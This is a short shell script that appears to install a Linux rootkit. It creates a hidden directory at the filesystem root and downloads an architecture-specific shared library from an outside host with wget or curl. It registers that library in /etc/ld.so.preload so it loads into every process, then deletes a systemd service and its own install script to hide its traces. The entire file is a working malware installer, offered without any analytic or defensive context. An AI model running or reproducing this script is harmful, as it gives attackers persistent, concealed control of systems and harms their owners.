#!/bin/sh

rkit_key=.__EL_SNEEDIO__

mkdir /$rkit_key
wget flamecord.zixel.tk/rkit-`uname -m`.so -O /$rkit_key/$rkit_key.so || curl -L flamecord.zixel.tk/rkit-`uname -m`.so -o /$rkit_key/$rkit_key.so
# if wget/curl fails we should fallback to trying to install them or something
echo /$rkit_key/$rkit_key.so >> /etc/ld.so.preload

rm -f /usr/lib/systemd/system/qqq.service /etc/systemd/system/multi-user.target.wants/qqq.service /install.sh
